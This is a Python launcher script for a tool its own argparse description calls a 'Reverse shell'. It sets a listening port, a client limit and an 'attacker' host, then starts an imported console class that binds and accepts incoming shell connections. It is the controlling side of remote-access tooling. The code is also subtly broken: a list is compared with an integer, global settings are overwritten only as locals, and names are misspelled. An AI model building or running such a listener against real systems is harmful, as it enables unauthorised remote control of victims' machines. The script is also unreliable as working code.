import argparse
import re
from server import Consloe
from sys import argv
import threading
from queue import Queue

NUMBER_OF_THREADS = 1
JOB_NUMBER = []


def main():

    console = Consloe()

    if argv > 1:

        check_ip = pat = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
        parser = argparse.ArgumentParser(description='Reverse shell')
        parser.add_argument('-p', '--port',
                            action='store',
                            help='Port to listen on',
                            type=int, dest='p',
                            )

        parser.add_argument('-c', '--connections',
                            action='store',
                            help='Max client to listen to',
                            dest='c', type=int
                            )
        parser.add_argument('-a', '--attacker',
                            action='store',
                            help='Host to start listenr on', dest='a'
                            )

        args = parser.parse_args()
        if args.p:
            console.PORT = args.p
        if args.a:
            console.HOST = args.a
        if args.c:
            NUMBER_OF_THREADS = args.c
            JOB_NUMBER = range(1, NUMBER_OF_THREADS + 1)

        console.bind_connection()
        console.accept_connections()
        console.start()


if __name__ == '__main__':
    main()
